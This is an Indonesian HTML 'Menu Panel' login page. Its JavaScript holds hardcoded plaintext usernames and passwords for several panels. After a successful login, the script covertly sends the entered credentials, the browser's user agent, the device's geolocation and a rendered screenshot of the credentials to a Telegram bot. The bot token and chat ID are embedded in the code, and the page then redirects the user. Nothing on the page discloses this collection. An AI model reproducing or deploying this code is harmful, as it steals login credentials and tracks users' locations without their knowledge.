<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Menu Panel</title>
  <style>
    :root {
      --primary: #7e57c2;
      --primary-dark: #5e35b1;
      --success: #2ecc71;
      --danger: #e74c3c;
      --text: #333;
      --bg: #f4f4f9;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: var(--bg);
      margin: 0;
      padding-top: 50px;
      text-align: center;
      color: var(--text);
    }

    h1 {
      margin-bottom: 30px;
      color: var(--primary-dark);
    }

    .panel-button {
      margin: 10px;
      padding: 15px 25px;
      font-size: 16px;
      background-color: var(--primary);
      border: none;
      color: white;
      border-radius: 12px;
      cursor: pointer;
      transition: background 0.3s, transform 0.2s;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }

    .panel-button:hover {
      background-color: var(--primary-dark);
      transform: translateY(-2px);
    }

    .login-form {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 25px 20px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      z-index: 1001;
      width: 300px;
    }

    .overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.4);
      z-index: 1000;
    }

    input[type="text"], input[type="password"] {
      width: 90%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
    }

    .login-form button {
      margin: 6px 4px;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    .login-form button:first-child {
      background-color: var(--success);
      color: white;
    }

    .login-form button:last-child {
      background-color: var(--danger);
      color: white;
    }

    #notif {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #444;
      color: #fff;
      padding: 12px 20px;
      border-radius: 10px;
      display: none;
      z-index: 1002;
      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
    }
  </style>
</head>
<body>

<h1>Menu Panel</h1>
<div id="menuContainer"></div>

<div class="overlay" id="overlay"></div>
<div class="login-form" id="loginForm">
  <h3 id="panelTitle">Login</h3>
  <input type="text" id="username" placeholder="Username"/><br>
  <input type="password" id="password" placeholder="Password"/><br><br>
  <button onclick="submitLogin()">Masuk</button>
  <button onclick="closeForm()">Batal</button>
</div>

<div id="notif"></div>
<div id="captureArea" style="display:none;">
  <div id="reportText"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script>
  const telegramToken = "7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE"; // Ganti dengan token bot kamu
  const chatId = "7274253936"; // Ganti dengan chat ID Telegram kamu

  const panels = [
    { name: "PRIBADIFAAN", user: "faan", pass: "OCTA", url: "https://example.com/pribadifaan" },
    { name: "PT JASTEB 1", user: "admin", pass: "111", url: "https://example.com/jasteb" },
    { name: "ZaanHost", user: "zan", pass: "zan", url: "https://example.com/zaanhost" },
    { name: "PRIBADI FAAN", user: "faantek", pass: "faantek", url: "https://example.com/faantek" },
    { name: "KOSONG", user: "test", pass: "123", url: "https://example.com/kosong" }
  ];

  let selectedPanel = null;

  function renderButtons() {
    const container = document.getElementById("menuContainer");
    panels.forEach(panel => {
      const btn = document.createElement("button");
      btn.className = "panel-button";
      btn.textContent = panel.name;
      btn.onclick = () => {
        selectedPanel = panel;
        document.getElementById("panelTitle").textContent = "Login - " + panel.name;
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
        document.getElementById("overlay").style.display = "block";
        document.getElementById("loginForm").style.display = "block";
      };
      container.appendChild(btn);
    });
  }

  function closeForm() {
    document.getElementById("overlay").style.display = "none";
    document.getElementById("loginForm").style.display = "none";
  }

  function submitLogin() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    if (!selectedPanel) return;

    if (username === selectedPanel.user && password === selectedPanel.pass) {
      showNotif("Login berhasil", "#2ecc71");

      const deviceInfo = navigator.userAgent;
      getLocation(locationUrl => {
        const message = `
<b>LOGIN PANEL</b>
<b>Panel:</b> ${selectedPanel.name}
<b>Username:</b> ${username}
<b>Password:</b> ${password}
<b>Waktu:</b> ${new Date().toLocaleString()}
<b>Perangkat:</b> ${deviceInfo}
<b>Lokasi:</b> ${locationUrl}
        `;
        sendTelegramMessage(message);

        document.getElementById("reportText").innerHTML = `
          <b>Login Panel:</b> ${selectedPanel.name}<br>
          <b>Username:</b> ${username}<br>
          <b>Password:</b> ${password}<br>
        `;
        html2canvas(document.getElementById("captureArea")).then(canvas => {
          sendImageToTelegram(canvas);
          setTimeout(() => window.location.href = selectedPanel.url, 1200);
        });
      });
    } else {
      showNotif("Username atau password salah!", "#e74c3c");
    }
  }

  function showNotif(message, color = "#444") {
    const notif = document.getElementById("notif");
    notif.style.background = color;
    notif.textContent = message;
    notif.style.display = "block";
    setTimeout(() => notif.style.display = "none", 3000);
  }

  function getLocation(callback) {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        callback(`https://www.google.com/maps?q=${lat},${lon}`);
      }, () => {
        callback("Lokasi tidak diizinkan");
      });
    } else {
      callback("Geolocation tidak didukung");
    }
  }

  function sendTelegramMessage(text) {
    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "HTML"
      })
    }).catch(err => console.error("Gagal kirim pesan:", err));
  }

  function sendImageToTelegram(canvas) {
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "login.png");
      fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
        method: "POST",
        body: formData
      }).catch(err => console.error("Gagal kirim foto:", err));
    });
  }

  renderButtons();
</script>

</body>
</html>
